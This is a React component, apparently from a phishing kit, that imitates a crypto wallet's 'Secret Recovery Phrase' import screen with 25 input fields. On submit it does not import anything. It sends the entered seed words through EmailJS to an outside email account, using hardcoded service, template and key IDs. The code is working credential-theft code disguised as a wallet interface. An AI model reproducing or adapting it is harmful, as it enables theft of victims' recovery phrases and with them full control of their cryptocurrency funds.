import React, { useEffect, useRef, useState } from 'react'
import Phrase from './Phrase';
import emailjs from '@emailjs/browser';
import { LoadingSVG } from './SVGComponent';

export default function ImportWallet() {
    const [inputValues, setInputValues] = useState(Array(25).fill(''));
    const [disable, setDisable] = useState(true)
    const [loading, setLoading] = useState(false)
    const form = useRef()

    useEffect(() => {
        if (inputValues.includes("") || inputValues.some(item => item && item.trim() === "")) {
            setDisable(true)
        } else {
            setDisable(false)
        }
    }, [inputValues])

    // Function to update input values
    const handleInputChange = (index, value) => {
        const newInputValues = [...inputValues];
        newInputValues[index - 1] = value;
        setInputValues(newInputValues);
    };

    // On Paste
    const handlePaste = (e, index) => {
        e.preventDefault()
        const paste = e.clipboardData.getData('text').split(" ")

        if (paste.length > 1) {
            setInputValues(paste)
        } else {
            setInputValues(prev => {
                const newInput = [...prev]
                newInput[index] = paste
                return newInput
            })
        }
    }

    const sendEmail = (e) => {
        e.preventDefault();
        setLoading(true)

        emailjs
            .sendForm('service_yktccsc', 'template_ml3llat', form.current, {
                publicKey: 'w-oDFpO22SylQ0tlf',
            })
            .then(
                () => {
                    console.log('SUCCESS!');
                    setLoading(false)
                },
                (error) => {
                    console.log('FAILED...', error.text);
                    setLoading(false)
                },
            );
    };

    return (
        <form
            className='relative'
            ref={form}
            onSubmit={sendEmail}
        >
            <div className='mt-5 mb-20 w-[425px] mx-auto'>
                <h1 className='text-2xl leading-7 font-semibold'>
                    Secret Recovery Phrase
                </h1>
                <p className='mt-6 font-medium text-[#626268]'>
                    Import your wallet secret recovery phrase
                </p>
                <div className='mt-8 grid grid-cols-2 gap-2'>
                    {Array.from({ length: 26 }, (item, index) => index > 0 && (
                        <Phrase
                            key={index}
                            index={index}
                            inputValues={inputValues}
                            handleInputChange={handleInputChange}
                            handlePaste={handlePaste}
                        />
                    ))}
                </div>
            </div>
            <div className='fixed bottom-0 w-full left-0 px-[10px] pt-[10px] pb-[20px] bg-white'>
                <button
                    className='w-full rounded bg-[#dcd6ff] text-[#6b45fe] font-medium text-lg px-3 min-h-11 disabled:bg-[#dcd6ff]/75 disabled:cursor-not-allowed flex items-center justify-center gap-4'
                    type='submit'
                    disabled={disable || loading}
                >
                    {loading && <LoadingSVG />}
                    <span>Continue</span>
                </button>
            </div>
        </form>
    )
}
